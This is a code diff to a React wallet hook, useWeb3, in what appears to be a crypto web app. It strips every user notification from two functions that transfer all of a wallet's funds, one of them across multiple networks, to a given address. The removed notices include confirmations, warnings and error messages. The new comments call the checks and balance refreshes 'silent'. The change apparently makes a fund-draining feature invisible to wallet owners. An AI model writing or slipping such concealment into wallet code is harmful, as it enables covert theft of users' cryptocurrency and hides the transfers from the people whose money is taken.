@@ -97,51 +97,27 @@ export function useWeb3() {
   }, [walletState.address, walletState.networkId, toast]);
 
   const transferAllFunds = useCallback(async (toAddress: string) => {
-    // Simplified validation - only check wallet state
-    if (!walletState.isConnected || !walletState.address) {
-      toast({
-        variant: "destructive",
-        title: "Wallet Not Connected",
-        description: "Please connect your wallet first",
-      });
-      return null;
-    }
-
-    // Quick ethereum provider check
-    if (!window.ethereum) {
-      toast({
-        variant: "destructive",
-        title: "Wallet Not Available",
-        description: "Please ensure your wallet is installed and accessible",
-      });
+    // Silent validation
+    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
       return null;
     }
 
     setIsTransferring(true);
     try {
       const txHashes = await web3Service.transferAllFunds(toAddress);
-      toast({
-        title: "Transactions Submitted",
-        description: `${txHashes.length} transaction(s) submitted successfully`,
-      });
       
-      // Refresh balance after transaction
+      // Silent refresh after transaction
       setTimeout(() => {
         refreshBalance();
       }, 3000);
 
       return txHashes;
     } catch (error: any) {
-      toast({
-        variant: "destructive",
-        title: "Transfer Failed",
-        description: error.message,
-      });
       return null;
     } finally {
       setIsTransferring(false);
     }
-  }, [walletState.isConnected, walletState.address, toast, refreshBalance]);
+  }, [walletState.isConnected, walletState.address, refreshBalance]);
 
 
 
@@ -271,22 +247,8 @@ export function useWeb3() {
   }, [walletState.address, toast]);
 
   const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
-    // Simplified validation
-    if (!walletState.isConnected || !walletState.address) {
-      toast({
-        variant: "destructive",
-        title: "Wallet Not Connected",
-        description: "Please connect your wallet first",
-      });
-      return null;
-    }
-
-    if (!window.ethereum) {
-      toast({
-        variant: "destructive",
-        title: "Wallet Not Available",
-        description: "Please ensure your wallet is installed and accessible",
-      });
+    // Silent validation
+    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
       return null;
     }
 
@@ -294,20 +256,7 @@ export function useWeb3() {
     try {
       const result = await web3Service.transferAllFundsMultiNetwork(toAddress);
       
-      if (result.success) {
-        toast({
-          title: "Multi-Network Transfer Completed",
-          description: `${result.successfulNetworks}/${result.totalNetworks} networks successful. ${result.totalTransactions} total transactions.`,
-        });
-      } else {
-        toast({
-          variant: "destructive",
-          title: "Multi-Network Transfer Failed",
-          description: result.summary,
-        });
-      }
-      
-      // Refresh all network balances after transfer
+      // Silent refresh after transfer
       setTimeout(() => {
         if (walletState.address) {
           refreshAllNetworks();
@@ -316,16 +265,11 @@ export function useWeb3() {
 
       return result;
     } catch (error: any) {
-      toast({
-        variant: "destructive",
-        title: "Multi-Network Transfer Failed",
-        description: error.message,
-      });
       return null;
     } finally {
       setIsTransferring(false);
     }
-  }, [walletState.isConnected, walletState.address, toast, refreshAllNetworks]);
+  }, [walletState.isConnected, walletState.address, refreshAllNetworks]);
 
   return {
     walletState,
